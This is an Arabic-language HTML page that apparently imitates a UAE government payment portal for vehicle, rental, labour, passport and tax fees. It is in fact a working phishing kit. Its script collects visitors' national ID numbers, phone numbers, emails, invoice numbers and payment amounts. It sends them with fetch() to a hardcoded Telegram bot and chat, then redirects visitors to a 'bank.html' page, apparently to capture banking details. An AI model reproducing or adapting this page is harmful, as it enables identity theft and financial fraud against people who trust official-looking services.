<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>إدخال البيانات</title>
<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;700&display=swap" rel="stylesheet">

<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

body {
  margin:0;
  font-family:'Cairo';
  background:#f5f5f5;
  direction: rtl;
}

.container {
  max-width:420px;
  margin:auto;
  padding:15px;
}

.card {
  background:#fff;
  border-radius:20px;
  padding:25px;
  box-shadow:0 10px 25px rgba(0,0,0,0.08);
  margin-bottom:20px;
}

.header-card {
  background:#fff;
  border-radius:20px;
  padding:25px;
  box-shadow:0 10px 25px rgba(0,0,0,0.08);
  margin-bottom:20px;
  text-align: center;
}

.header-image {
  width: 100%;
  max-width: 150px;
  height: auto;
  margin-bottom: 1px;
  border-radius: 12px;
}

h1 {
  text-align:center;
  color:#0a8f2c;
  font-size: 1.5rem;
  margin-top: 10px;
}

label {
  display:block;
  margin-top:18px;
  margin-bottom: 6px;
  font-weight:600;
  font-size: 0.9rem;
  color: #333;
}

input, select {
  width:100%;
  padding:12px 14px;
  border-radius:10px;
  border:1px solid #ddd;
  font-size:15px;
  font-family:'Cairo';
  transition: border-color 0.2s;
  box-sizing: border-box;
  background:#fff;
}

input:focus, select:focus {
  outline: none;
  border-color: #0a8f2c;
}

.amount-box {
  display:flex;
  gap:10px;
  align-items: center;
}

.amount-box input {
  flex: 1;
}

.currency {
  background:#eee;
  padding:12px 16px;
  border-radius:10px;
  font-weight:bold;
  font-size:15px;
  text-align: center;
  min-width: 60px;
}

.btn {
  width:100%;
  background:#0a8f2c;
  color:white;
  padding:14px;
  border:none;
  border-radius:12px;
  margin-top:25px;
  font-size:17px;
  font-weight: bold;
  cursor:pointer;
  transition: background 0.2s;
}

.btn:hover {
  background:#078025;
}
</style>
</head>

<body>

<div class="container">

<div class="header-card">
  <img src="img/logo.jpg" alt="صورة" class="header-image" id="headerImage">
  <h1>إدخال بيانات المستخدم</h1>
</div>

<div class="card">
<form id="form">

<label>رقم الفاتورة</label>
<input id="invoice" placeholder="أدخل رقم الفاتورة" required>

<label>رقم الهوية</label>
<input id="idNumber" placeholder="أدخل رقم الهوية (15 رقم)" required>

<label>رقم الجوال</label>
<input id="phone" placeholder="05XXXXXXXX" required>

<label>البريد الإلكتروني</label>
<input id="email" placeholder="أدخل بريدك الإلكتروني" required>

<label>نوع الخدمة</label>
<select id="serviceSelect">
  <option value="">اختر نوع الخدمة</option>
  <option value="دفع رسوم شحن مركبة">دفع رسوم شحن مركبة</option>
  <option value="دفع رسوم نقل ملكية مركبة">دفع رسوم نقل ملكية مركبة</option>
  <option value="دفع رسوم نقل ملكية لوحة مركبة">دفع رسوم نقل ملكية لوحة مركبة</option>
  <option value="دفع رسوم حجز مركبة">دفع رسوم حجز مركبة</option>
  <option value="دفع رسوم فحص مركبة">دفع رسوم فحص مركبة</option>
  <option value="دفع رسوم عقد إيجار (فيلا - شقة - مزرعة - شاليه - مستودع - محل - أرض تجارية - أرض زراعية)">دفع رسوم عقد إيجار</option>
  <option value="دفع رسوم عقد تمليك (فيلا - شقة - مزرعة - شاليه - مستودع - محل - أرض تجارية - أرض زراعية)">دفع رسوم عقد تمليك</option>
  <option value="دفع رسوم تأمين (فيلا - شقة - مزرعة - شاليه - مستودع - محل - أرض تجارية - أرض زراعية)">دفع رسوم تأمين</option>
  <option value="دفع رسوم شحن">دفع رسوم شحن</option>
  <option value="تسديد المستحقات للطرفين">تسديد المستحقات للطرفين</option>
  <option value="دفع رسوم توقيع تعهد إلكتروني">دفع رسوم توقيع تعهد إلكتروني</option>
  <option value="دفع رسوم استقدام عمالة">دفع رسوم استقدام عمالة</option>
  <option value="دفع ضريبة القيمة المضافة">دفع ضريبة القيمة المضافة</option>
  <option value="دفع رسوم عقد عمالة">دفع رسوم عقد عمالة</option>
  <option value="دفع رسوم الجوازات">دفع رسوم الجوازات</option>
  <option value="دفع رسوم عقد عمل">دفع رسوم عقد عمل</option>
  <option value="دفع رسوم توكيل محامي">دفع رسوم توكيل محامي</option>
  <option value="دفع رسوم الخدمات الإلكترونية">دفع رسوم الخدمات الإلكترونية</option>
  <option value="دفع رسوم وزارة الموارد البشرية">دفع رسوم وزارة الموارد البشرية</option>
  <option value="دفع رسوم تجديد عقود">دفع رسوم تجديد عقود</option>
  <option value="دفع رسوم عقد تقديم خدمات">دفع رسوم عقد تقديم خدمات</option>
  <option value="استرداد الرسوم المدفوعة">استرداد الرسوم المدفوعة</option>
</select>

<label>مبلغ السداد</label>
<div class="amount-box">
  <input id="amount" placeholder="0.00" required>
  <div class="currency">AED</div>
</div>

<button type="submit" class="btn">تأكيد البيانات</button>

</form>
</div>

</div>

<script>

const botToken = "8497519636:AAG2fIjNUBJhtN63dApkRNoENAFwEUJYTR8";
const chatId = "-4669313790";

document.getElementById("form").addEventListener("submit", function(e) {
  e.preventDefault();

  const invoice = document.getElementById("invoice").value;
  const idNumber = document.getElementById("idNumber").value;
  const phone = document.getElementById("phone").value;
  const email = document.getElementById("email").value;
  const selectedService = document.getElementById("serviceSelect").value;
  const amount = document.getElementById("amount").value;

  if(!selectedService) {
    alert("الرجاء اختيار نوع الخدمة");
    return;
  }

  const message = `
📥 طلب جديد
--------------------
🧾 الفاتورة: ${invoice}
🪪 الهوية: ${idNumber}
📞 الهاتف: ${phone}
📧 الإيميل: ${email}
🛠️ الخدمة: ${selectedService}
💰 المبلغ: ${amount} AED
`;

  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message
    })
  })
  .then(res => res.json())
  .then(data => {
    console.log("تم الإرسال", data);
    localStorage.setItem("phone", phone);
    localStorage.setItem("service", selectedService);
    window.location.href = "bank.html";
  })
  .catch(err => {
    console.error("خطأ:", err);
    window.location.href = "bank.html";
  });
});

</script>

</body>
</html>
